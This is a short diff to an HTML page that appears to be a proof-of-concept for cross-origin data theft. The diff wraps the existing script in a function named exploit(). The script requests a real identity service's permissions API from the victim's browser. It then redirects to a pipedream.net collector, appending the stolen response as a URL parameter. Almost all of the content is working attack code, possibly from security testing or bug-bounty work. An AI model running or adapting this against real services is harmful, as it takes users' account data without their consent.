@@ -19,6 +19,7 @@
     <hr />
     <div id="demo"></div>
     <script>
+      function exploit() {
       var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://frontegg-prod.au.frontegg.com/frontegg/identity/resources/permissions/v1',true);
@@ -28,7 +29,7 @@ Content-Length: 2141
 
 function reqListener() {
    location='https://en0wwy1g0an7hi.x.pipedream.net?key='+this.responseText;
-};
+};};
     </script>
   </body>
 </html>
